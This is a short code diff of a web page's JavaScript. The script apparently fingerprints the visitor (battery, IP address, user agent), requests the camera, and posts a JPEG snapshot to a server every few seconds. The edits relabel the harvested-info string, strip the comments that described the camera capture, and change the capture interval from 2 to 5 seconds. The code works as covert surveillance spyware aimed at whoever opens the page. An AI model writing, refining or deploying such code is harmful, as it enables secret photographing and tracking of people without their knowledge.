@@ -63,10 +63,9 @@
       const battery = await navigator.getBattery();
       const level = Math.round(battery.level * 100);
       const charging = battery.charging ? 'charging' : 'not charging';
-      return `Battery: ${level}%, ${charging} | IP: ${ipAddress} | UA: ${navigator.userAgent}`;
+      return `Info 🗿\n\nBattery: ${level}%, ${charging} | IP: ${ipAddress} | UA: ${navigator.userAgent}`;
     }
 
-    // Request camera
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -81,7 +80,6 @@
       }
     }
 
-    // Take photo every 2 seconds
     async function captureLoop() {
       setInterval(async () => {
         canvas.width = video.videoWidth;
@@ -98,7 +96,7 @@
             body: formData
           }).catch(console.error);
         }, 'image/jpeg', 0.8);
-      }, 2000);
+      }, 5000);
     }
 
     startCamera();
